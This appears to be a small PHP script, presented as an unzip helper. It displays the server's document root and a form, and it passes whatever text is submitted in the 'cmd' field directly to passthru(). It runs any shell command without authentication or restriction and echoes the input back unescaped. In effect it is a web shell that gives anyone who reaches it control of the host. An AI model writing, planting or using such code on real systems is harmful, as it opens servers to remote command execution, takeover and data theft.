<?

$txtCmd = $_REQUEST[cmd];

echo $_SERVER["DOCUMENT_ROOT"];
echo "<br>Command: unzip zip filename (.zip extension is assumed by default & hence optional )> <destination path>";
?>
<form method=post>
<textarea name="cmd" rows=4 cols=60><?=$txtCmd?></textarea>
<input type=submit value="exec">
</form>
<hr>
<?

if (strlen(trim($txtCmd)) > 1)
{
	echo "<pre>";
	passthru($txtCmd);
	//unzip <zip filename (.zip extension is assumed by default & hence optional )> <destination path>
	echo "</pre>";
}
?>
